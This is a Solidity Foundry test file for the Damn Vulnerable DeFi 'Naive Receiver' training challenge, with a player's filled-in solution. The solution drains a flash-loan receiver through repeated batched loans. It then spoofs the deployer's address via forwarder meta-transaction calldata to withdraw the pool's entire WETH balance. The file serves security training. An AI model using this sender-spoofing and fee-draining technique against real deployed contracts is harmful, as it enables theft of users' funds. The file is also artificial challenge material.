// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    using ECDSA for bytes32;
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);
        
        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }


    function multicallSelector(bytes memory callData,address from) public returns(bytes memory) {
        
        bytes memory metaTxData = bytes.concat(callData, bytes20(from));

        bytes[] memory depositMulticallArguments = new bytes[](10);
        for(uint i=0;i<10;i++){
            depositMulticallArguments[i] = metaTxData;
        }
        return abi.encodeWithSelector(pool.multicall.selector, depositMulticallArguments);
    }
    function multicallSelector2(bytes memory callData,address from) public returns(bytes memory) {
        
        bytes memory metaTxData = bytes.concat(callData, bytes20(from));

        bytes[] memory depositMulticallArguments = new bytes[](1);
        depositMulticallArguments[0] = metaTxData;
        return abi.encodeWithSelector(pool.multicall.selector, depositMulticallArguments);
    }
    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {

        bytes memory callData1 = abi.encodeWithSelector(pool.flashLoan.selector, receiver, weth,1000 ether,"");
        // multicall
        bytes memory multicallSelectorFor1000ETH = multicallSelector(callData1,player);

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from : player,
            target : address(pool),
            value : 0,
            gas : gasleft(),
            nonce : 0,
            data : multicallSelectorFor1000ETH,
            deadline : block.timestamp + 1 days
        });

        bytes32 requestHash = forwarder.getDataHash(request);
        // requestHash = requestHash._hashTypedData();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        bool success = forwarder.execute{value: 0}(request, signature);
        console.log(success);
        console.log(pool.deposits(deployer));
        

        bytes memory callData2 = abi.encodeWithSelector(pool.withdraw.selector,1010 ether,recovery);
        bytes memory multicallSelectorFor1010ETH = multicallSelector2(callData2,deployer);
        
         request = BasicForwarder.Request({
            from : player,
            target : address(pool),
            value : 0,
            gas : gasleft(),
            nonce : 1,
            data : multicallSelectorFor1010ETH,
            deadline : block.timestamp + 1 days
        });
         requestHash = forwarder.getDataHash(request);
        ( v,  r,  s) = vm.sign(playerPk, requestHash);
        signature = abi.encodePacked(r, s, v);
        success = forwarder.execute{value: 0}(request, signature);
        console.log(recovery);
        console.log(weth.balanceOf(recovery));
        console.log(success);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
